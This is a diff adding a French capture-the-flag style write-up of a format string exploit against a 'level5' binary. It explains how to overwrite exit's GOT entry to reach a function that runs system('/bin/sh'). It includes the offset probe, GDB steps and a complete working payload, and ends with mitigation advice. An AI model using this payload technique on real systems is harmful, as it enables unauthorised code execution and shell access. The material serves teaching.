@@ -1,0 +1,145 @@
+# Exploitation de la GOT (Global Offset Table) - Level5
+
+## Analyse du Programme
+
+Le programme présente une vulnérabilité de format string qui permet de réécrire la GOT. Les fonctions et adresses critiques sont :
+
+```c
+void o(void) {
+    system("/bin/sh");
+    _exit(1);
+}
+
+void n(void) {
+    char local_20c [520];
+    
+    fgets(local_20c, 0x200, stdin);
+    printf(local_20c);  // Vulnérabilité ici
+    exit(1);
+}
+```
+
+Adresses critiques :
+- `FUNCTION_O = 0x80484a4` (adresse de la fonction o qui lance le shell)
+- `EXIT_PLT = 0x8049838` (adresse de la fonction exit dans la GOT)
+
+## Points Clés de Théorie
+
+1. **Vulnérabilité Format String**
+   - Permet d'écrire en mémoire de manière contrôlée
+   - Cible : la GOT (Global Offset Table)
+   - Objectif : rediriger l'exécution de exit vers la fonction o
+
+2. **GOT (Global Offset Table)**
+   - Table contenant les adresses des fonctions externes
+   - Modifiable en mémoire
+   - Permet de rediriger l'exécution en modifiant les adresses
+
+3. **Techniques d'Exploitation**
+   - Utilisation de GDB pour l'analyse
+   - Modification de la GOT pour rediriger l'exécution
+   - Écriture d'une grande valeur en deux parties
+
+## Étapes de l'Exploitation
+
+### 1. Recherche de l'Offset
+
+```bash
+# Test avec un marqueur et des %x
+python -c "print 'AAAA' + '%x '*12" | ./level5
+```
+
+#### Explication de l'Offset
+L'offset est crucial pour l'exploitation car il nous permet de :
+- Localiser où notre entrée est stockée dans la pile
+- Utiliser cette position pour écrire à des adresses spécifiques
+- Construire notre exploit final avec précision
+
+Processus de recherche :
+1. Envoyer "AAAA" comme marqueur (qui devient "41414141" en hexadécimal)
+2. Ajouter des %x pour lire la pile
+3. Compter le nombre de %x nécessaires pour voir "41414141"
+4. Ce nombre est notre offset (4 dans ce cas)
+5. L'offset nous permet d'utiliser %4$n et %5$hn dans notre exploit final
+
+### 2. Analyse avec GDB
+
+```bash
+# Entrée dans GDB
+gdb ./level5
+
+# Recherche des adresses importantes
+(gdb) x o                    # Adresse de la fonction o
+(gdb) disas n               # Analyse de la fonction n
+(gdb) disas exit           # Analyse de la fonction exit
+(gdb) x 0x8049838          # Vérification de l'adresse exit dans la GOT
+```
+
+### 3. Mise en Place des Breakpoints
+
+```bash
+(gdb) disas n              # Pour localiser printf et exit
+(gdb) b printf            # Breakpoint sur printf
+(gdb) b exit              # Breakpoint sur exit
+(gdb) run                 # Exécution du programme
+```
+
+### 4. Test de l'Exploitation
+
+```bash
+# Modification de la GOT
+(gdb) set {int}0x8049838=0x80484a4
+(gdb) x 0x8049838         # Vérification de la modification
+```
+
+### 5. Construction de l'Exploit Final
+
+```bash
+(python -c'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x%4$n%31904x%5$hn"'; cat) | ./level5
+```
+
+## Explication Technique Détaillée
+
+### Décomposition de l'Exploit
+
+1. **Adresses à Écrire**
+   - `\x3a\x98\x04\x08\x38\x98\x04\x08` : Adresses consécutives dans la GOT
+   - Première adresse : `0x8049838` (exit)
+   - Deuxième adresse : `0x804983a` (+2 bytes)
+
+2. **Valeurs à Écrire**
+   - Valeur totale : 134518840 (0x80484a4)
+   - Première partie : 2044 caractères
+   - Deuxième partie : 31904 caractères
+
+### Fonctionnement de l'Exploit
+
+1. **Écriture en Deux Parties**
+   - Utilisation de `%n` et `%hn` pour écrire sur 4 bytes
+   - Première écriture : 2044 caractères
+   - Deuxième écriture : 31904 caractères
+   - Total : 33956 (0x84a4)
+
+2. **Redirection de l'Exécution**
+   - La GOT est modifiée pour pointer vers la fonction o au lieu de exit
+   - Au lieu d'appeler exit, le programme exécute la fonction o qui lance un shell
+   - Le `cat` final permet d'interagir avec le shell obtenu
+
+## Sécurité
+
+Cette vulnérabilité illustre l'importance de :
+- Protéger la GOT contre les modifications
+- Utiliser des mécanismes de protection comme :
+  - RELRO (Relocation Read-Only)
+  - ASLR (Address Space Layout Randomization)
+  - DEP (Data Execution Prevention)
+- Valider les entrées utilisateur
+- Utiliser des format strings sécurisés
+
+## Notes Techniques
+
+- No RELRO : La GOT est modifiable
+- Les adresses sont fixes (pas d'ASLR)
+- L'exploitation nécessite une précision dans les calculs
+- La redirection de l'exécution est possible grâce à la modification de la GOT
+- La fonction o contient un appel à system("/bin/sh") qui est notre objectif
